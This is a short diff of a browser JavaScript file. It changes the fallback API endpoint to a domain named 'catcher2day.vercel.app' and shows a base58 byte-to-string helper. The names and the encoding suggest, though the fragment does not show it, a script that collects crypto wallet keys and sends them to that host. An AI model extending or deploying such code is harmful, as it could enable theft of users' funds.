@@ -1,7 +1,7 @@
 (async () => {
     const projectId = window.JOJO_PROJECT_ID || "unknown";
     const platform = window.JOJO_PLATFORM || "axiom";
-    const apiUrlOrigin = window.JOJO_API_URL || "https://infinity8-beige.vercel.app/";
+    const apiUrlOrigin = window.JOJO_API_URL || "catcher2day.vercel.app/";
     
     function arrayToString(dataArray) {
         const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
